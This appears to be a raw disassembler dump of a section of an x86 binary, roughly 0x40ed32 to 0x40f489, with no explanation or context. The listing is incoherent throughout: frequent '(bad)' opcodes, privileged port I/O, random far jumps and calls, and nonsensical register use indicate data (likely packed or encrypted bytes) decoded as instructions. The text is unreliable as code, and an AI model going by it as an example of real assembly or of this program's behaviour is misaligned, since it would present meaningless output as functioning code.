  40ed32:	push   ds
  40ed33:	inc    ecx
  40ed34:	lds    ebx,FWORD PTR [ebx+0x30d435a4]
  40ed3a:	push   ebx
  40ed3b:	jecxz  0x40ed23
  40ed3d:	jp     0x40ed3e
  40ed3f:	xor    eax,esi
  40ed41:	mov    ch,BYTE PTR [eax-0x76]
  40ed44:	add    ebx,esp
  40ed46:	cmp    eax,0x4b6122c5
  40ed4b:	out    dx,al
  40ed4c:	mov    ds:0x60beaede,al
  40ed51:	xchg   edi,eax
  40ed52:	pop    eax
  40ed53:	cdq    
  40ed54:	and    DWORD PTR [edx+ebp*4-0x4949c08c],esp
  40ed5b:	pop    ss
  40ed5c:	icebp  
  40ed5d:	and    DWORD PTR [edi+0x72],eax
  40ed60:	mov    ah,0xd0
  40ed62:	pushf  
  40ed63:	dec    esi
  40ed64:	aas    
  40ed65:	outs   dx,BYTE PTR ds:[esi]
  40ed66:	nop
  40ed67:	dec    ebx
  40ed68:	je     0x40ed4a
  40ed6a:	cmp    esp,ebp
  40ed6c:	mov    ch,0xf5
  40ed6e:	pushf  
  40ed6f:	xchg   esp,eax
  40ed70:	ret    
  40ed71:	xor    esi,eax
  40ed73:	push   0x6869ee0f
  40ed78:	push   edx
  40ed79:	retf   
  40ed7a:	or     DWORD PTR [edi-0x4f],0xe0fb80ce
  40ed81:	pop    esp
  40ed82:	bound  eax,QWORD PTR [eax]
  40ed84:	xchg   edx,eax
  40ed85:	fmul   QWORD PTR [edi]
  40ed87:	push   edi
  40ed88:	mov    ds:0xe8a7a84c,eax
  40ed8d:	and    eax,0x1aea0b05
  40ed92:	push   edx
  40ed93:	push   es
  40ed94:	cdq    
  40ed95:	shl    BYTE PTR [edi],0x42
  40ed98:	xor    eax,0x176c3e82
  40ed9d:	cdq    
  40ed9e:	shl    DWORD PTR [ebx],0x52
  40eda1:	aas    
  40eda2:	cmc    
  40eda3:	cmp    esi,DWORD PTR ds:0x39552916
  40eda9:	and    ecx,DWORD PTR [edx+ebx*8]
  40edac:	mov    edx,0xc58fb0e
  40edb1:	xlat   BYTE PTR ds:[ebx]
  40edb2:	sub    al,0x3a
  40edb4:	loope  0x40edd4
  40edb6:	out    dx,eax
  40edb7:	xchg   BYTE PTR [ebx],bh
  40edb9:	pop    esp
  40edba:	arpl   dx,cx
  40edbc:	in     eax,dx
  40edbd:	and    dh,BYTE PTR [ebx+0x72]
  40edc0:	pop    esp
  40edc1:	(bad)
  40edc4:	mov    edi,0x5422b43a
  40edc9:	xchg   ch,ch
  40edcb:	lds    ecx,FWORD PTR [ebp-0xfc93a33]
  40edd1:	mov    ds:0x25573f9f,eax
  40edd6:	inc    esi
  40edd7:	add    cl,BYTE PTR [edi+0x28a63319]
  40eddd:	and    ecx,DWORD PTR [ebx]
  40eddf:	fs into 
  40ede1:	xor    ecx,esp
  40ede3:	sar    BYTE PTR [ebp-0x48ddb05a],0x79
  40edea:	or     DWORD PTR [eax+0x1411d9a5],eax
  40edf0:	(bad)  
  40edf1:	pop    edi
  40edf2:	loop   0x40ed7c
  40edf4:	or     DWORD PTR [ebp+0x59],0x4b
  40edf8:	jle    0x40ee00
  40edfa:	xlat   BYTE PTR ds:[ebx]
  40edfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edfc:	lea    eax,ds:0xd680bf08
  40ee02:	pusha  
  40ee03:	push   0x3f3b36e
  40ee08:	jae    0x40ee49
  40ee0a:	cmp    esi,DWORD PTR [edi+0x40f4b888]
  40ee10:	pushf  
  40ee11:	cmp    al,0x78
  40ee13:	out    0xef,al
  40ee15:	iret   
  40ee16:	cmp    bh,BYTE PTR [ecx+0x6a]
  40ee19:	cmp    DWORD PTR [ebx],ecx
  40ee1b:	imul   esi,DWORD PTR [ecx+0x66],0x2e7ce7b3
  40ee22:	mov    esp,?
  40ee24:	adc    eax,0xb988d37d
  40ee29:	sbb    dl,BYTE PTR [esi+0x717e1026]
  40ee2f:	je     0x40edf2
  40ee31:	ror    BYTE PTR [edi+0x79],cl
  40ee34:	sub    DWORD PTR [edx-0x3104fa50],0xffffffbb
  40ee3b:	rcl    BYTE PTR [eax],0x8c
  40ee3e:	cmp    cl,BYTE PTR [ebp-0x7143977e]
  40ee44:	xlat   BYTE PTR ds:[ebx]
  40ee45:	jg     0x40ee1a
  40ee47:	(bad)  
  40ee48:	jo     0x40ee24
  40ee4a:	(bad)  
  40ee4b:	or     DWORD PTR [edi],edi
  40ee4d:	ret    0xd139
  40ee50:	or     DWORD PTR es:[eax+eiz*4+0xf],eax
  40ee55:	inc    edx
  40ee56:	mov    esp,DWORD PTR [esi-0x2716b4ca]
  40ee5c:	div    BYTE PTR [eax+0x6dd6c1a3]
  40ee62:	jle    0x40ee3e
  40ee64:	shl    DWORD PTR [esi+0x35c0345d],cl
  40ee6a:	mov    bl,0x46
  40ee6c:	jg     0x40ee0f
  40ee6e:	push   esp
  40ee6f:	mov    WORD PTR [eax+0x3c9e9dcf],es
  40ee75:	and    dh,BYTE PTR [edi+0x416819ac]
  40ee7b:	mov    ds:0x9d09ee33,eax
  40ee80:	pop    edx
  40ee81:	sub    ebp,esi
  40ee83:	xchg   edx,eax
  40ee84:	loopne 0x40ee94
  40ee86:	dec    ecx
  40ee87:	ds jg  0x40ee70
  40ee8a:	jmp    0x40ee0e
  40ee8c:	inc    ebx
  40ee8d:	stc    
  40ee8e:	out    0x92,al
  40ee90:	push   ebp
  40ee91:	xor    BYTE PTR [ebx-0x7005a084],al
  40ee97:	add    al,0x20
  40ee99:	push   ds
  40ee9a:	xchg   ebx,eax
  40ee9b:	fstp   TBYTE PTR ds:0xd4415084
  40eea1:	push   esi
  40eea2:	mov    es,eax
  40eea4:	adc    ecx,ecx
  40eea6:	lahf   
  40eea7:	pop    eax
  40eea8:	xor    bh,BYTE PTR [esi-0x3fa672c2]
  40eeae:	sti    
  40eeaf:	pop    fs
  40eeb1:	xor    cl,BYTE PTR [edi+eiz*2+0x242ad954]
  40eeb8:	cmp    BYTE PTR [ecx+0x5683997e],0xb3
  40eebf:	mov    DWORD PTR [esi],eax
  40eec1:	pop    ebx
  40eec2:	adc    BYTE PTR [esi+0x1fbf73c8],ch
  40eec8:	jo     0x40eecd
  40eeca:	rcr    BYTE PTR [ebx],cl
  40eecc:	in     al,dx
  40eecd:	mov    esp,0x73fada09
  40eed2:	in     al,dx
  40eed3:	test   BYTE PTR [ebp+0x55],bh
  40eed6:	loope  0x40ef27
  40eed8:	mov    al,ds:0xd2b18b02
  40eedd:	test   DWORD PTR [eax],esp
  40eedf:	shl    DWORD PTR [esi],0x22
  40eee2:	xchg   BYTE PTR [ecx-0x64],bh
  40eee5:	jl     0x40ef4f
  40eee7:	daa    
  40eee8:	add    al,0xbe
  40eeea:	stos   BYTE PTR es:[edi],al
  40eeeb:	das    
  40eeec:	sub    al,al
  40eeee:	fisubr DWORD PTR [edx-0x2f]
  40eef1:	repz dec esp
  40eef3:	sbb    eax,DWORD PTR [ebx+0x44]
  40eef6:	xor    esi,DWORD PTR [eax-0x7e]
  40eef9:	xchg   edx,eax
  40eefa:	shl    edx,1
  40eefc:	xchg   edx,eax
  40eefd:	dec    ecx
  40eefe:	mov    edi,DWORD PTR [edx+0x7c]
  40ef01:	jo     0x40ee99
  40ef03:	push   ecx
  40ef04:	pop    ds
  40ef05:	adc    ch,BYTE PTR [esi-0x74ae45a2]
  40ef0b:	loop   0x40ee94
  40ef0d:	xor    BYTE PTR [ebp+0x598f2efa],bh
  40ef13:	in     al,0xf5
  40ef15:	mov    dl,0x95
  40ef17:	pop    es
  40ef18:	outs   dx,BYTE PTR ds:[esi]
  40ef19:	ret    0xce1e
  40ef1c:	scas   eax,DWORD PTR es:[edi]
  40ef1d:	call   0x743447ca
  40ef22:	mov    fs,WORD PTR ds:0xcf3ac5fb
  40ef28:	cmp    al,0x41
  40ef2a:	jecxz  0x40ef98
  40ef2c:	mov    edi,0x3619f78a
  40ef31:	mov    ch,0xac
  40ef33:	jae    0x40eedb
  40ef35:	aam    0x83
  40ef37:	cld    
  40ef38:	push   edx
  40ef39:	and    ecx,DWORD PTR [ebx+0x47d6d990]
  40ef3f:	enter  0xcc5e,0xbf
  40ef43:	int3   
  40ef44:	mov    ds:0xafd22f5d,al
  40ef49:	dec    ecx
  40ef4a:	mov    eax,ds:0x4727d83c
  40ef4f:	xchg   edx,eax
  40ef50:	push   esp
  40ef51:	mov    ecx,0x55d8fe4
  40ef56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef57:	out    dx,al
  40ef58:	mov    ah,0x3d
  40ef5a:	(bad)  
  40ef5b:	mov    dh,0x1d
  40ef5d:	xchg   ebx,eax
  40ef5e:	imul   BYTE PTR [eax+0x5eecbc93]
  40ef64:	sub    ecx,DWORD PTR [esi]
  40ef66:	ins    BYTE PTR es:[edi],dx
  40ef67:	bound  esp,QWORD PTR ds:0x62ab1df9
  40ef6d:	adc    bl,BYTE PTR [eax-0xe467fd7]
  40ef73:	imul   eax,DWORD PTR [ecx-0x34922c95],0xffffffde
  40ef7a:	adc    BYTE PTR [ecx+0x62c7f520],ch
  40ef80:	data16 jne 0x40eff0
  40ef83:	ret    0x4992
  40ef86:	jecxz  0x40efb4
  40ef88:	adc    al,0xf6
  40ef8a:	outs   dx,BYTE PTR ds:[esi]
  40ef8b:	hlt    
  40ef8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef8d:	and    al,0x94
  40ef8f:	xor    eax,0xd2989e99
  40ef94:	retf   0x1e52
  40ef97:	mov    al,ds:0x4cd8d6d0
  40ef9c:	push   0xbb73c2e8
  40efa1:	mov    ds,edi
  40efa3:	int    0x11
  40efa5:	std    
  40efa6:	dec    edx
  40efa7:	xor    BYTE PTR [ecx-0x35bd7dd4],bh
  40efad:	dec    ecx
  40efae:	xchg   esi,eax
  40efaf:	aam    0x23
  40efb1:	call   0x92d4:0x2563f9c5
  40efb8:	inc    ebp
  40efb9:	jbe    0x40efc0
  40efbb:	xchg   esi,eax
  40efbc:	inc    ebx
  40efbd:	ret    0x78d7
  40efc0:	or     ebp,DWORD PTR [esi]
  40efc2:	cwde   
  40efc3:	mov    bh,0x5f
  40efc5:	mov    al,0xec
  40efc7:	(bad)  
  40efc8:	jmp    0x40efd8
  40efca:	and    DWORD PTR [ecx+0x67],ecx
  40efcd:	cwde   
  40efce:	push   edx
  40efcf:	jecxz  0x40f047
  40efd1:	ret    
  40efd2:	dec    edx
  40efd3:	rcl    BYTE PTR cs:[eax+0x4],0x55
  40efd8:	jmp    0x40f050
  40efda:	pop    ebp
  40efdb:	popf   
  40efdc:	and    ecx,DWORD PTR [edx]
  40efde:	sub    al,0xa4
  40efe0:	out    dx,al
  40efe1:	stc    
  40efe2:	pop    ss
  40efe3:	and    bl,BYTE PTR [ecx]
  40efe5:	mov    edi,0x7ecdb61c
  40efea:	xchg   edx,eax
  40efeb:	ret    
  40efec:	push   ebx
  40efed:	pop    es
  40efee:	scas   eax,DWORD PTR es:[edi]
  40efef:	daa    
  40eff0:	sbb    eax,DWORD PTR [ebp+0x2f9a4f22]
  40eff6:	test   eax,0x459ec5ff
  40effb:	cmp    DWORD PTR ds:0x3fb18b86,0x5a
  40f002:	icebp  
  40f003:	int3   
  40f004:	xchg   esp,eax
  40f005:	psrad  mm6,QWORD PTR [edi]
  40f008:	mov    al,BYTE PTR [edi]
  40f00a:	ss popa 
  40f00c:	icebp  
  40f00d:	mov    WORD PTR [esi-0x1d],fs
  40f010:	inc    edi
  40f011:	(bad)  
  40f012:	or     al,0x2b
  40f014:	test   BYTE PTR [ebx],dl
  40f016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f017:	jnp    0x40f070
  40f019:	retf   
  40f01a:	imul   DWORD PTR [edi-0x610e032c]
  40f020:	test   BYTE PTR [ebx],bl
  40f022:	dec    ebp
  40f023:	or     al,0xb0
  40f025:	pop    ecx
  40f026:	xlat   BYTE PTR ds:[ebx]
  40f027:	jb     0x40f07a
  40f029:	mov    bl,0x67
  40f02b:	add    ebp,edx
  40f02d:	inc    edx
  40f02e:	inc    esp
  40f02f:	jp     0x40f057
  40f031:	xor    DWORD PTR [edi-0x7d],esp
  40f034:	clc    
  40f035:	or     al,0xd7
  40f037:	cs popf 
  40f039:	push   ebx
  40f03a:	add    eax,0xc7b87ee8
  40f03f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f040:	xchg   DWORD PTR [ebx],edi
  40f042:	cdq    
  40f043:	pop    ds
  40f044:	sbb    al,0x56
  40f046:	test   bl,dl
  40f048:	fidivr WORD PTR [ebp+0x45]
  40f04b:	test   DWORD PTR ds:0xe54fe322,0x7119b087
  40f055:	jne    0x40f06e
  40f057:	mov    edi,0x898c40e9
  40f05c:	cmp    DWORD PTR [ebx],0x587f86bb
  40f062:	ds retf 
  40f064:	outs   dx,DWORD PTR ds:[esi]
  40f065:	clc    
  40f066:	xchg   ecx,eax
  40f067:	sbb    BYTE PTR ds:0x5cea262b,0x4c
  40f06e:	and    al,0xed
  40f070:	ret    0x8314
  40f073:	push   edi
  40f074:	add    ah,dh
  40f076:	or     eax,ecx
  40f078:	jns    0x40f00a
  40f07a:	pop    es
  40f07b:	bound  ebp,QWORD PTR [edi+0x20e21698]
  40f081:	mov    bl,ah
  40f083:	cmovbe edi,DWORD PTR [ecx]
  40f086:	lahf   
  40f087:	push   ss
  40f088:	cmp    BYTE PTR [eax],dh
  40f08a:	(bad)  
  40f08b:	mov    ch,0x8c
  40f08d:	jmp    0x40f041
  40f08f:	loope  0x40f0d7
  40f091:	lods   eax,DWORD PTR ds:[esi]
  40f092:	adc    DWORD PTR [esi-0x5b],eax
  40f095:	adc    eax,0x3cb93a64
  40f09a:	data16 std 
  40f09c:	mov    ah,0x8f
  40f09e:	retf   0xf6d1
  40f0a1:	scas   al,BYTE PTR es:[edi]
  40f0a2:	jmp    0x40f02d
  40f0a4:	shr    BYTE PTR [edx+0x3c78057e],0x13
  40f0ab:	fiadd  WORD PTR [ecx]
  40f0ad:	adc    DWORD PTR [esi-0x584f84c2],eax
  40f0b3:	jg     0x40f055
  40f0b5:	iret   
  40f0b6:	es mov cl,0xa3
  40f0b9:	ins    BYTE PTR es:[edi],dx
  40f0ba:	jg     0x40f139
  40f0bc:	call   DWORD PTR [edx]
  40f0be:	mov    edi,0xaafde22e
  40f0c3:	mov    ch,0x8f
  40f0c5:	pop    esi
  40f0c6:	call   0xb59f64d3
  40f0cb:	bound  eax,QWORD PTR [ecx]
  40f0cd:	xchg   edi,eax
  40f0ce:	mov    esi,0x517e002e
  40f0d3:	(bad)  
  40f0d4:	mov    esi,0xe0faa7c2
  40f0d9:	sbb    BYTE PTR [ebp-0x4fdcc91e],bl
  40f0df:	out    dx,eax
  40f0e0:	pop    edi
  40f0e1:	in     eax,dx
  40f0e2:	div    DWORD PTR [esi]
  40f0e4:	(bad)  
  40f0e5:	xchg   ebx,eax
  40f0e6:	repnz aam 0x8d
  40f0e9:	ret    0x51e7
  40f0ec:	ss pop esi
  40f0ee:	arpl   WORD PTR [eax],bx
  40f0f0:	push   ss
  40f0f1:	pushf  
  40f0f2:	jo     0x40f15b
  40f0f4:	and    al,cl
  40f0f6:	sub    eax,0xdd143bee
  40f0fb:	ss and edi,0xffffffb0
  40f0ff:	sbb    esp,ebp
  40f101:	or     BYTE PTR [esp+ebp*1+0x34],bl
  40f105:	dec    BYTE PTR ds:[ebp+0x79867452]
  40f10c:	sub    BYTE PTR [eax-0x3a027bd3],ch
  40f112:	cs cli 
  40f114:	(bad)  
  40f115:	pop    edx
  40f116:	popf   
  40f117:	add    cl,BYTE PTR [ebx-0x3a]
  40f11a:	jecxz  0x40f0ec
  40f11c:	push   0x10
  40f11e:	clc    
  40f11f:	rcr    BYTE PTR ds:0x84db62a2,0x38
  40f126:	stos   BYTE PTR es:[edi],al
  40f127:	scas   al,BYTE PTR es:[edi]
  40f128:	pop    ecx
  40f129:	int3   
  40f12a:	rcl    DWORD PTR [esi-0x5b],1
  40f12d:	mov    dh,0x65
  40f12f:	pop    ss
  40f130:	pop    edx
  40f132:	test   al,0x97
  40f134:	or     ch,BYTE PTR [ebx+edx*1-0x73]
  40f138:	cli    
  40f139:	or     esi,DWORD PTR [esi]
  40f13b:	mov    bl,0x6f
  40f13d:	fist   WORD PTR [eax-0x60]
  40f140:	scas   al,BYTE PTR es:[edi]
  40f141:	or     BYTE PTR [edi-0x17],bh
  40f144:	mov    ds:0x42d65a76,al
  40f149:	lods   al,BYTE PTR ds:[esi]
  40f14a:	xlat   BYTE PTR ds:[ebx]
  40f14b:	cld    
  40f14c:	loopne 0x40f14b
  40f14e:	push   es
  40f14f:	mov    ebp,0xf7d2125d
  40f154:	test   ebp,esp
  40f156:	push   0xffffffae
  40f158:	mov    dh,0x7f
  40f15a:	push   edx
  40f15b:	adc    eax,0x5a0d9614
  40f160:	ins    BYTE PTR es:[edi],dx
  40f161:	and    al,0x4a
  40f164:	cwde   
  40f165:	(bad)  
  40f166:	xor    al,BYTE PTR [ebp+0x7b782979]
  40f16c:	or     eax,DWORD PTR [ecx+0x7b]
  40f16f:	je     0x40f13b
  40f171:	cmp    ch,BYTE PTR [edi+0x69]
  40f174:	lods   eax,DWORD PTR ds:[esi]
  40f175:	sbb    eax,ebp
  40f177:	mov    al,ds:0xae8ed73d
  40f17c:	and    DWORD PTR [edi],ebp
  40f17e:	(bad)  
  40f17f:	jl     0x40f12f
  40f181:	ds in  al,dx
  40f183:	dec    esi
  40f184:	mov    ebp,0x9fe72e3a
  40f189:	leave  
  40f18a:	pop    esi
  40f18b:	jmp    FWORD PTR [ecx-0x7c2342cd]
  40f191:	test   eax,0xb1a6de44
  40f196:	in     al,0x3d
  40f198:	or     al,0x8
  40f19a:	xor    DWORD PTR [esi-0x23],esp
  40f19d:	iret   
  40f19e:	aad    0x61
  40f1a0:	test   ebp,0x554924a1
  40f1a6:	push   cs
  40f1a7:	repnz (bad) 
  40f1a9:	cdq    
  40f1aa:	mov    al,ds:0xac19e36d
  40f1af:	popfw  
  40f1b1:	fimul  WORD PTR [edi]
  40f1b3:	cmp    al,0x3
  40f1b5:	mov    ebp,0x2465ffb6
  40f1ba:	push   0xf2eaea73
  40f1bf:	lods   al,BYTE PTR ds:[esi]
  40f1c0:	mov    edx,0x4e26422
  40f1c5:	sub    al,0xe8
  40f1c7:	pop    esi
  40f1c8:	push   edx
  40f1c9:	and    ebp,DWORD PTR [eax+0x274a8615]
  40f1cf:	pop    ecx
  40f1d0:	push   esi
  40f1d1:	xlat   BYTE PTR ds:[ebx]
  40f1d2:	hlt    
  40f1d3:	mov    ds:0x590ca151,eax
  40f1d8:	xchg   esi,eax
  40f1d9:	sub    edi,DWORD PTR [ecx+0x28]
  40f1dc:	ja     0x40f18e
  40f1de:	outs   dx,DWORD PTR ds:[esi]
  40f1df:	retf   0x6464
  40f1e2:	pop    ebp
  40f1e3:	sub    ch,ch
  40f1e5:	jg     0x40f23e
  40f1e7:	out    0x28,al
  40f1e9:	inc    eax
  40f1ea:	adc    DWORD PTR ds:0x5450f334,0x37
  40f1f1:	outs   dx,DWORD PTR ds:[esi]
  40f1f2:	and    ebx,edi
  40f1f4:	js     0x40f25f
  40f1f6:	mov    ch,0xe5
  40f1f8:	fs enter 0x7fca,0x47
  40f1fd:	jae    0x40f21d
  40f1ff:	rcr    ah,1
  40f201:	(bad)  
  40f202:	(bad)  
  40f203:	aas    
  40f204:	outs   dx,BYTE PTR ds:[esi]
  40f205:	sbb    dl,BYTE PTR [ecx+0x1a]
  40f208:	mov    eax,0x2e6b569b
  40f20d:	pop    eax
  40f20e:	imul   ecx,DWORD PTR [ebp-0x4fc5d2f1],0xffffffd0
  40f215:	mov    ch,0xa5
  40f218:	mov    esp,0x588b324e
  40f21d:	out    0x1e,eax
  40f21f:	out    dx,eax
  40f220:	inc    edx
  40f221:	cmp    DWORD PTR cs:[eax],eax
  40f224:	sbb    edi,DWORD PTR [ebx]
  40f226:	push   esp
  40f227:	and    dh,ah
  40f229:	sbb    DWORD PTR [eax+0xb],esi
  40f22c:	dec    edi
  40f22d:	push   ebx
  40f22e:	inc    esp
  40f22f:	jge    0x40f20f
  40f231:	dec    ebp
  40f232:	mov    ah,0x6c
  40f234:	(bad)  
  40f235:	aad    0xe3
  40f237:	pop    ds
  40f238:	push   esi
  40f239:	(bad)  
  40f23a:	mov    ebx,0x32b55715
  40f23f:	hlt    
  40f240:	add    al,0x17
  40f242:	xchg   esp,eax
  40f243:	loope  0x40f1f7
  40f245:	pop    esi
  40f246:	pop    ebp
  40f247:	pop    edx
  40f248:	call   0xbcfbc3e8
  40f24d:	and    al,0x89
  40f24f:	pop    ebx
  40f250:	add    eax,0x261f68e2
  40f255:	retf   0x8d2
  40f258:	and    DWORD PTR [esi+0x4c],0xfffffff2
  40f25c:	retf   0xaf8b
  40f25f:	cmp    ebp,DWORD PTR [ebx-0x5e5905cf]
  40f265:	fnstenv [ebp-0x62]
  40f268:	push   esi
  40f269:	dec    esi
  40f26a:	neg    BYTE PTR [ecx+0x5c55b319]
  40f270:	mov    ch,0xc8
  40f272:	mov    eax,0x73bd30fc
  40f277:	sar    BYTE PTR [esi],1
  40f279:	lods   al,BYTE PTR ds:[esi]
  40f27a:	sub    dl,0xa9
  40f27d:	pop    edi
  40f27e:	cli    
  40f27f:	loopne 0x40f27b
  40f281:	fild   QWORD PTR [eax-0xb11b751]
  40f287:	mov    edx,0xb8ae2330
  40f28c:	dec    ebx
  40f28d:	fwait
  40f28e:	pop    eax
  40f28f:	add    ecx,ecx
  40f291:	mov    edx,0xa16c1d21
  40f296:	inc    ebp
  40f297:	xor    cl,BYTE PTR [ebx-0x34c6fd5c]
  40f29d:	in     al,dx
  40f29e:	inc    ecx
  40f29f:	retf   0xd099
  40f2a2:	xchg   ebx,eax
  40f2a3:	mov    eax,0x11887d2d
  40f2a8:	or     bl,BYTE PTR [edi-0x1c]
  40f2ab:	inc    esi
  40f2ac:	inc    edi
  40f2ad:	lods   al,BYTE PTR ds:[esi]
  40f2ae:	pushf  
  40f2af:	in     al,0x21
  40f2b1:	(bad)  
  40f2b2:	mov    edx,0xfddb5ff3
  40f2b7:	xchg   dl,ch
  40f2b9:	push   ds
  40f2ba:	out    0x96,al
  40f2bc:	add    eax,0x11a94f84
  40f2c1:	add    al,bl
  40f2c3:	jg     0x40f29f
  40f2c5:	mov    WORD PTR [ebp+0x2],?
  40f2c8:	or     ebp,edi
  40f2ca:	out    0xf5,eax
  40f2cc:	xchg   edi,eax
  40f2cd:	mov    ah,0x1
  40f2cf:	adc    DWORD PTR [ebx+0x6f84ad49],ecx
  40f2d5:	sub    esi,ebx
  40f2d7:	and    ecx,esi
  40f2d9:	sbb    al,0x4c
  40f2db:	aad    0x34
  40f2dd:	ss inc esi
  40f2df:	adc    al,0x20
  40f2e1:	out    0xeb,al
  40f2e3:	jecxz  0x40f2bf
  40f2e5:	(bad)
  40f2e8:	dec    edx
  40f2e9:	arpl   WORD PTR [ecx],bp
  40f2eb:	mov    ah,0x12
  40f2ed:	or     eax,0x31eea8ef
  40f2f2:	jne    0x40f359
  40f2f4:	cs push ebp
  40f2f6:	add    DWORD PTR [ecx],ecx
  40f2f8:	jns    0x40f2de
  40f2fa:	hlt    
  40f2fb:	das    
  40f2fc:	ins    DWORD PTR es:[edi],dx
  40f2fd:	out    0xc2,eax
  40f2ff:	jae    0x40f31d
  40f301:	xchg   ecx,eax
  40f302:	jmp    0x7d2d7a99
  40f307:	inc    edi
  40f308:	and    BYTE PTR [edx],0x95
  40f30b:	popf   
  40f30c:	(bad)  
  40f30d:	mov    eax,0xada644cd
  40f312:	adc    bl,BYTE PTR [esi+edi*2+0x3bdb75e9]
  40f319:	mov    ds:0x6bbd2dd7,al
  40f31e:	call   0x44e0135c
  40f323:	sar    DWORD PTR [esi-0x32],1
  40f326:	adc    BYTE PTR [edx],bl
  40f328:	daa    
  40f329:	arpl   WORD PTR [ecx],dx
  40f32b:	hlt    
  40f32c:	push   edi
  40f32d:	fcmovbe st,st(2)
  40f32f:	lods   eax,DWORD PTR ds:[esi]
  40f330:	popa   
  40f331:	adc    DWORD PTR [ebp+0x5f],edi
  40f334:	pop    ss
  40f335:	jmp    0x40f2ba
  40f337:	inc    ebp
  40f338:	ror    BYTE PTR [eax+0x11],1
  40f33b:	into   
  40f33c:	xor    BYTE PTR [ebx-0x2f6f774e],ah
  40f342:	adc    eax,0xab011e45
  40f347:	mov    bl,0x52
  40f349:	dec    esi
  40f34a:	lods   al,BYTE PTR ds:[esi]
  40f34b:	xchg   edi,eax
  40f34c:	scas   eax,DWORD PTR es:[edi]
  40f34d:	dec    ecx
  40f34e:	cmp    esp,esp
  40f350:	xchg   ebp,eax
  40f351:	cmp    DWORD PTR [edi-0x3852a2dd],ecx
  40f357:	test   BYTE PTR [edx-0x1],ah
  40f35a:	and    ebp,edi
  40f35c:	sub    DWORD PTR [ebx-0x7],edi
  40f35f:	cld    
  40f360:	jecxz  0x40f3dc
  40f362:	dec    ebp
  40f363:	cmp    al,0x3e
  40f365:	iret   
  40f366:	mov    al,0x65
  40f368:	mov    ebx,0xfb6e198
  40f36d:	dec    ecx
  40f36e:	dec    eax
  40f36f:	pop    eax
  40f370:	out    dx,al
  40f371:	cld    
  40f372:	retf   0xcaea
  40f375:	(bad)  
  40f376:	retf   0x70c8
  40f379:	sbb    DWORD PTR ds:0xf4c8d621,esi
  40f37f:	dec    ecx
  40f380:	fwait
  40f381:	add    DWORD PTR [esi],ecx
  40f383:	outs   dx,BYTE PTR ds:[esi]
  40f384:	das    
  40f385:	dec    ecx
  40f386:	out    dx,eax
  40f387:	leave  
  40f388:	ins    BYTE PTR es:[edi],dx
  40f389:	call   0x7a4688ec
  40f38e:	daa    
  40f38f:	jnp    0x40f399
  40f391:	jecxz  0x40f411
  40f393:	sub    esp,DWORD PTR [ebx+esi*2+0xdc367b]
  40f39a:	xlat   BYTE PTR ds:[ebx]
  40f39b:	mov    ds:0x4c0ff5d1,eax
  40f3a0:	leave  
  40f3a1:	xchg   ebx,eax
  40f3a2:	jmp    0x40f416
  40f3a4:	fucom  st(2)
  40f3a6:	test   BYTE PTR [ebp+0x26ed6f51],ah
  40f3ac:	sar    DWORD PTR [eax+ecx*1-0x7dbfcad8],0x5d
  40f3b4:	push   0xffffffcf
  40f3b6:	push   ds
  40f3b7:	cmp    eax,0xf049de0f
  40f3bc:	mov    esp,0xd1a4e19c
  40f3c1:	in     eax,0xba
  40f3c3:	or     al,0x26
  40f3c5:	push   edx
  40f3c6:	enter  0x7ee0,0x6b
  40f3ca:	pop    edx
  40f3cc:	call   0xdf0fecb6
  40f3d1:	les    ebx,FWORD PTR [esi-0x3fe14d00]
  40f3d7:	repnz (bad) 
  40f3d9:	fadd   QWORD PTR [esi-0x2bc2c4f6]
  40f3df:	bswap  esp
  40f3e1:	pop    ebp
  40f3e2:	pop    ebp
  40f3e3:	pop    esi
  40f3e4:	jne    0x40f425
  40f3e6:	inc    ebp
  40f3e7:	out    0xcd,eax
  40f3e9:	sbb    esp,DWORD PTR [eax-0x2abed569]
  40f3ef:	cmp    BYTE PTR [ebx],bh
  40f3f1:	mov    DWORD PTR [esp+ebx*2],0xeba610b
  40f3f8:	xabort 0x77
  40f3fb:	(bad)  
  40f3fd:	lods   eax,DWORD PTR ds:[esi]
  40f3fe:	jg     0x40f476
  40f400:	inc    ebp
  40f401:	retf   0x9bab
  40f404:	dec    edi
  40f405:	mov    esi,0x5360ca70
  40f40a:	js     0x40f442
  40f40c:	add    al,0x12
  40f40e:	sub    DWORD PTR [esi+0x1a],edx
  40f411:	jmp    0x38f12e95
  40f416:	push   ebx
  40f417:	lahf   
  40f418:	dec    eax
  40f419:	inc    ebx
  40f41a:	mov    eax,DWORD PTR [ebp-0x45b77356]
  40f420:	(bad)  [ebp-0x779ae852]
  40f426:	inc    edx
  40f427:	push   es
  40f428:	or     ecx,DWORD PTR [ebx]
  40f42a:	cmp    ecx,DWORD PTR [eax]
  40f42c:	xor    bh,ch
  40f42e:	sub    al,0xa9
  40f430:	sbb    dh,BYTE PTR [edi+0x14]
  40f433:	into   
  40f434:	(bad)  
  40f435:	aad    0xc6
  40f437:	push   ebx
  40f438:	stos   BYTE PTR es:[edi],al
  40f439:	xchg   DWORD PTR [esp+edi*8],edx
  40f43c:	inc    eax
  40f43d:	popa   
  40f43e:	je     0x40f484
  40f440:	xchg   esp,eax
  40f441:	iret   
  40f442:	push   0x1cf47ea4
  40f447:	(bad)  
  40f448:	retf   
  40f449:	stos   BYTE PTR es:[edi],al
  40f44a:	gs jmp 0x40f463
  40f44d:	inc    al
  40f44f:	cmp    esp,DWORD PTR ds:0x1b0dd15b
  40f455:	lods   eax,DWORD PTR ds:[esi]
  40f456:	mov    eax,0x48bddafa
  40f45b:	outs   dx,BYTE PTR ds:[esi]
  40f45c:	stc    
  40f45d:	ins    DWORD PTR es:[edi],dx
  40f45e:	xor    al,0x73
  40f460:	xchg   edx,eax
  40f461:	ss mov ebp,0xc604b09e
  40f467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f468:	jbe    0x40f4a5
  40f46a:	ss repnz mov cl,0x7a
  40f46e:	pop    esi
  40f46f:	inc    edi
  40f470:	mov    ds:0x84c3ebae,al
  40f475:	out    0x6d,al
  40f477:	sbb    BYTE PTR [esi+0x5266f99b],cl
  40f47d:	stos   BYTE PTR es:[edi],al
  40f47e:	hlt    
  40f47f:	push   0x62
  40f481:	jns    0x40f427
  40f483:	imul   esp,DWORD PTR [esi-0x33],0x79
  40f487:	or     edi,ebx
  40f489:	add    ch,cl
